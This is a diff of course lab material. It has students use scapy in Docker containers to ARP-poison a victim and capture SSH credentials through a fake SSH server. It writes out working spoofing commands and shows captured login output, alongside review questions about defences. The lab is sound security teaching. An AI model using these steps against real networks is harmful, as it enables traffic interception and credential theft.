@@ -172,22 +172,29 @@ This then allows an attacker to capture traffic from other machines on the netwo
 
 === ARP Poisoning
 
+[.float-group]
+--
+
 image::arp.svg[width=500, float=left]
 
 An attacker may also use ARP packets to impersonate another machine on the network, such as a gateway router.
 By repeatedly sending out ARP packets, _gratuitous arp_, redirecting packets bound for the gateway's IP to the attackers MAC address an attacker can set up a MitM scenario.
 This is particularly difficult because depending on the TTL of the ARP cache it may take up to 20 minutes for normal network operations to resume.
 
-== MitM Lab
+--
+
+== Review
+
+=== Labs
+
+.Getting Scrapy with Scapy
+[lab]
+--
 
 In this lab we will use a fake SSH server, https://github.com/jaksi/sshesame[sshesame], and an interactive packet manipulation program, https://scapy.net/[scapy], to disrupt an ongoing SSH session between victim and server, position ourself in the middle of the traffic, and capture the username and password victim is using.
 
-WARNING: For this lab our IP address are configured statically and are known to the attacker.
-         It is also assumed that the attacker is on the local network.
-         Lastly victim has been poorly configured to ignore changes to the host key.
-         This is not entirely unreasonable as many users just ignore the warnings and clear out the known_hosts file.
-
 .IP Addresses Used
+[width=50%, float=right]
 |===
 |Name|IP Address
 
@@ -197,7 +204,108 @@ WARNING: For this lab our IP address are configured statically and are known to 
 
 |===
 
-We'll start by _executing_ (recall that at this point it's already running sshesame in the background) a BASH shell on attacker and configuring it to accept packets not only for its own IP address, but also for the server's IP address.
+For this lab our IP addresses are configured statically and are known to the attacker.
+It is also assumed that the attacker is on the local network.
+Lastly victim has been poorly configured to ignore changes to the host key.
+This is not entirely unreasonable as many users just ignore the warnings and clear out the known_hosts file when prompted anyway.
+
+Start by downloading the scapy.zip file which contains the Docker Compose configuration we will be using.
+Uncompress it to a directory where you have write access.
+This lab will require us to use three terminal windows/tabs: one for the `docker-compose up` command which will show the output of everything running in the background, one for the victim which will show an SSH session with the server, and one for the attacker which we will use to make the attack.
+
+[svgbob, scapy, width=800, align=center]
+....
+             Terminal 1                                  Terminal 2
+.-------------------------------------.   .-------------------------------------.
+|                                 - X |   |                                 - X |
++-------------------------------------+   +-------------------------------------+
+|                                     |   |                                     |
+| "$ docker-compose up"               |   | "$ ssh server"                      |
+|                                     |   |                                     |
+|                                     |   |                                     |
+|                                     |   |                                     |
+'-------------------------------------'   '-------------------------------------'
+
+                                   Terminal 3
+                    .-------------------------------------.
+                    |                                 - X |
+                    +-------------------------------------+
+                    |                                     |
+                    | "$ scapy"                           |
+                    | ">>>"                               |
+                    |                                     |
+                    |                                     |
+                    '-------------------------------------'
+....
+
+Open three terminals and `cd` into the directory where you uncompressed the lab zip file in each of them.
+There should be a `docker-compose.yml` file and `server`, `victim`, and `attacker` directories in the directory you are in.
+
+In the first terminal run the `docker-compose up` command to build the images and run the containers:
+
+.docker-compose up
+[source, text]
+----
+PS C:\Users\rxt1077\it230\labs\scapy> docker-compose up
+Creating network "scapy_testnet" with the default driver
+Creating scapy_server_1   ... done
+Creating scapy_victim_1   ... done
+Creating scapy_attacker_1 ... done
+Attaching to scapy_victim_1, scapy_server_1, scapy_attacker_1
+server_1    | > Starting SSHD
+server_1    | >> Generating new host keys
+scapy_victim_1 exited with code 0
+attacker_1  | INFO 2021/10/07 13:56:45 No host keys configured, using keys at "/root/.local/share/sshesame"
+attacker_1  | INFO 2021/10/07 13:56:45 Host key "/root/.local/share/sshesame/host_rsa_key" not found, generating it
+attacker_1  | INFO 2021/10/07 13:56:45 Host key "/root/.local/share/sshesame/host_ecdsa_key" not found, generating it
+attacker_1  | INFO 2021/10/07 13:56:45 Host key "/root/.local/share/sshesame/host_ed25519_key" not found, generating it
+attacker_1  | INFO 2021/10/07 13:56:45 Listening on [::]:22 <1>
+server_1    | ssh-keygen: generating new host keys: RSA DSA ECDSA ED25519
+server_1    | >>> Fingerprints for dsa host key
+server_1    | 1024 MD5:a5:e6:e9:38:d2:2e:88:fd:f0:aa:a8:05:07:35:5f:18 root@a010fe3c2f3c (DSA)
+server_1    | 1024 SHA256:NM7DONpt1doZp4e6WV+6WVVr+KUrh9luUSRcAhnzdyw root@a010fe3c2f3c (DSA)
+server_1    | 1024 SHA512:LHfFdSk1XiAKQArH0CW+RkaKv5GgovPCH7UIQ+P4T2LbgGpCBP5aGA1V3oriYbTZWuS9TlUgDbEfTBq19AV/cA root@a010fe3c2f3c (DSA)
+server_1    | >>> Fingerprints for rsa host key
+server_1    | 3072 MD5:74:44:b6:a2:74:b9:7e:1b:ba:3d:27:b8:19:3a:48:df root@a010fe3c2f3c (RSA)
+server_1    | 3072 SHA256:mubm9mLNrdNDk5fyj0dghDBIbbwcVKXo23Qdv61/S/c root@a010fe3c2f3c (RSA)
+server_1    | 3072 SHA512:JFQhS6trY7sNqRSwZ+t0uyBb5ddNh9qSLtBrMaa5G7xWzKHpxCuKBSDbvLk4W9JKeQftTU4293UDV9vqCcf/6w root@a010fe3c2f3c (RSA)
+server_1    | >>> Fingerprints for ecdsa host key
+server_1    | 256 MD5:15:75:5f:9b:72:7c:f0:13:ea:0d:b4:47:b7:62:69:63 root@a010fe3c2f3c (ECDSA)
+server_1    | 256 SHA256:4p/Afp/8C2tHn7AePdS7OHCgPxfBamdaLIUg4IJ7xx4 root@a010fe3c2f3c (ECDSA)
+server_1    | 256 SHA512:NnbevqBXFkGQWIirdFsLPnX85q7q/1Y7E4i+BLHLqE3cg2aqkduBJsssyr9+G7bSvq7txvjl9SRmyRAzuDT7DQ root@a010fe3c2f3c (ECDSA)
+server_1    | >>> Fingerprints for ed25519 host key
+server_1    | 256 MD5:ad:00:61:26:4d:a0:07:be:6b:8e:91:bd:f0:65:e6:14 root@a010fe3c2f3c (ED25519)
+server_1    | 256 SHA256:Vl7jQulDsONglP1xbSN+J8nSfCaIER40rHhgy7z/BYg root@a010fe3c2f3c (ED25519)
+server_1    | 256 SHA512:WkmvOWe6oaZ/qE1ZiA0rZAjn9H+hCDxI8NHpsjRNCalK/CgVV9+VhkzHgRTKfKTqQeE0y/Zz2GaEJGv/sapCHg root@a010fe3c2f3c (ED25519)
+server_1    | WARNING: No SSH authorized_keys found!
+server_1    | >> Unlocking root account
+server_1    | WARNING: password authentication enabled.
+server_1    | WARNING: password authentication for root user enabled.
+server_1    | >> Running: /etc/entrypoint.d/changepw.sh
+server_1    | Running /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config
+server_1    | Server listening on 0.0.0.0 port 22. <2>
+server_1    | Server listening on :: port 22.
+----
+<1> Notice that attacker has a fake SSH server running in the background
+<2> Notice that server has a legitimate SSH server running in the background
+
+In the second terminal run `docker-compose run victim bash` and then from the prompt we'll SSH to server using the password "password":
+
+.victim
+[source, text]
+----
+PS C:\Users\rxt1077\it230\labs\scapy> docker-compose run victim bash
+Creating scapy_victim_run ... done
+bash-5.0# ssh server
+Warning: Permanently added 'server,172.20.0.5' (ECDSA) to the list of known hosts.
+root@server's password: <1>
+You are now logged into 'server' (presumably from 'victim') via SSH for this assignment.
+Leave this connection open while you experiment with scapy from 'attacker'.
+bf9ebe42a108:~#
+----
+<1> The password is "password"
+
+In the third terminal we'll start by _executing_ (recall that at this point it's already running sshesame in the background) a BASH shell on attacker and configuring it to accept packets not only for its own IP address, but also for the server's IP address.
 Once traffic is routed to us, this will allow attacker to also respond to packets destined for 172.20.0.5.
 
 .attacker
@@ -269,70 +377,130 @@ Since we're working in python, let's make our lives easier by defining a few sim
 ----
 <1> IPv4 addresses are strings in scapy
 
-Now we are going to craft and send a broadcast ethernet frame with an ARP "who-has" request for the server's IP address.
-The result will tell use what server's MAC address is:
+Now let's see how scapy allows us to build packets.
+We'll make an Ethernet frame, with an IP packet inside it, with an ICMP echo request in that, with the data being set to our name:
 
 .attacker
 [source, text]
 ----
->>> whohas = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=server_ip) <1>
->>> whohas.show()
+>>> ping = Ether()/IP(dst=server_ip)/ICMP()/"Ryan Tolboom" <1>
+>>> ping.show() <2>
 ###[ Ethernet ]###
-  dst       = ff:ff:ff:ff:ff:ff
+  dst       = 02:42:ac:14:00:05
   src       = 02:42:ac:14:00:07
-  type      = ARP
-###[ ARP ]###
-     hwtype    = 0x1
-     ptype     = IPv4
-     hwlen     = None
-     plen      = None
-     op        = who-has
-     hwsrc     = 02:42:ac:14:00:07
-     psrc      = 172.20.0.7
-     hwdst     = 00:00:00:00:00:00
-     pdst      = 172.20.0.5
+  type      = IPv4
+###[ IP ]###
+     version   = 4
+     ihl       = None
+     tos       = 0x0
+     len       = None
+     id        = 1
+     flags     =
+     frag      = 0
+     ttl       = 64
+     proto     = icmp
+     chksum    = None
+     src       = 172.20.0.7
+     dst       = 172.20.0.5
+     \options   \
+###[ ICMP ]###
+        type      = echo-request
+        code      = 0
+        chksum    = None
+        id        = 0x0
+        seq       = 0x0
+        unused    = ''
+###[ Raw ]###
+           load      = 'Ryan Tolboom'
 
->>> ans, unans = srp(whohas) <2>
+>>> result = srp1(ping) <3>
+Begin emission:
+Finished sending 1 packets.
+.*
+Received 2 packets, got 1 answers, remaining 0 packets
+>>> result.show()
+###[ Ethernet ]###
+  dst       = 02:42:ac:14:00:07
+  src       = 02:42:ac:14:00:05
+  type      = IPv4
+###[ IP ]###
+     version   = 4
+     ihl       = 5
+     tos       = 0x0
+     len       = 40
+     id        = 62086
+     flags     =
+     frag      = 0
+     ttl       = 64
+     proto     = icmp
+     chksum    = 0x301a
+     src       = 172.20.0.5
+     dst       = 172.20.0.7
+     \options   \
+###[ ICMP ]###
+        type      = echo-reply
+        code      = 0
+        chksum    = 0xea7a
+        id        = 0x0
+        seq       = 0x0
+        unused    = ''
+###[ Raw ]###
+           load      = 'Ryan Tolboom'
+
+>>> server_mac = result[0][0].src
+>>> server_mac
+'02:42:ac:14:00:05'
 ----
 <1> Scapy uses the '/' operator to nest protocols.
-    This is an ARP packet _in_ an Ethernet frame.
-<2> The `srp` function sends _and_ receives layer 2 traffic.
-    It's response is a tuple of answered packets and unanswered packets.
+    This is my name in an ICMP packet, in an IP packet, in an Ethernet frame.
+    Be sure you use your own name!
+<2> The `show()` command prints out packets in detail
+<3> The `srp1()` function sends and receives _one_ packet at Layer 2
 
-Now we should have our answer in `ans` but it is burried in an list of QueryAnswer structures and needs to be unpacked a bit.
-Let's get it out and put it in a variable called `server_mac`.
+Notice how we use this to capture the server's MAC address and save it in the `server_mac` variable.
 
-.attacker
-[source, text]
-----
->>> server_mac = ans[0][1].src <1>
->>> server_mac
-'02:42:ac:14:00:05' <2>
-----
-<1> This is the first response, 0, answer section, 1, source address of the machine that responded to our query.
-    Feel free to explore the structure more on the command line.
-<2> This was the MAC address I found, but yours may be different.
+[IMPORTANT.deliverable]
+====
+Take a screenshot of your scapy session at this point showing that you completed an ICMP echo request/response with your name in it.
+====
 
-This is how an ARP exchange is supposed to work.
-We broadcast out asking what MAC we should use for a certain IP and we get a response _from the person who legitimately has that MAC and IP_.
-Now we'll craft a new packet for the victim to find out their MAC address and store it in `victim_mac`:
+We can also determine MAC addresses at Layer 2 with an ARP "who-has" request.
+Let's craft and send a broadcast ethernet frame with an ARP "who-has" request for the victims's IP address.
+The result will tell use what the victim's MAC address is:
 
 .attacker
 [source, text]
 ----
->>> whohas = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip) <1>
->>> ans, unans = srp(whohas)
+>>> whohas = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip)
+>>> result = srp1(whohas)
 Begin emission:
 Finished sending 1 packets.
 *
 Received 1 packets, got 1 answers, remaining 0 packets
->>> victim_mac = ans[0][1].src
->>> victim_mac
-'02:42ac:14:00:06'
-----
-<1> Don't forget to change the IP to the victim_ip!
+>>> result.show()
+###[ Ethernet ]###
+  dst       = 02:42:ac:14:00:07
+  src       = 02:42:ac:14:00:06 <1>
+  type      = ARP
+###[ ARP ]###
+     hwtype    = 0x1
+     ptype     = IPv4
+     hwlen     = 6
+     plen      = 4
+     op        = is-at
+     hwsrc     = 02:42:ac:14:00:06
+     psrc      = 172.20.0.6
+     hwdst     = 02:42:ac:14:00:07
+     pdst      = 172.20.0.7
 
-Now we have everything we need to create an ARP packet telling the victim to send traffic to us when they are trying to access servers IP:
+>>> victim_mac = result[0].src
+----
+<1> This is my MAC address of victim, but yours may be different!
+
+This is how an ARP exchange is supposed to work.
+We broadcast out asking what MAC we should use for a certain IP and we get a response _from the person who legitimately has that MAC and IP_.
+
+We have everything we need to create an ARP packet telling the victim to send traffic to us when they are trying to access servers IP:
 
 .attacker
 [source, text]
@@ -351,7 +519,7 @@ Now let's make and view an evil ARP packet:
 <ARP  op=is-at psrc=172.20.0.5 hwdst=02:42:ac:14:00:06 pdst=172.20.0.6 |>
 ----
 
-This packet posits itself as coming from the server, it is aimed at the victim in both IP and MAC, but the MAC address that will be used to send it is ours.
+This packet posits itself as coming from the server, it is aimed at the victim in both IP and MAC, but the MAC address that will be used to send it is ours (by default, we don't specify with `hwsrc`).
 This means the victim will update their ARP cache such that frames destined for server go to attacker.
 This effectively reroutes all layer 2 traffic that was going to the server from the victim.
 
@@ -393,3 +561,18 @@ Take a look at the output from the terminal running `docker-compose up`, you'll 
 ----
 attacker_1  | 2021/10/07 01:21:41 [172.20.0.6:60252] authentication for user "root" with password "password" accepted
 ----
+
+[IMPORTANT.deliverable]
+====
+[qanda]
+How would you create an ARP packet in scapy to reverse the change you made previously and fix the route?::
+    {empty}
+Would using keys instead of passwords help prevent this kind of attack? Why or why not?::
+    {empty}
+How would managing host keys correctly prevent this kind of attack?::
+    {emtpy}
+====
+
+To stop the running containers, you can type Ctrl-C in the terminal running `docker-compose up`, exit out of the victim, and exit out of the attacker.
+
+--
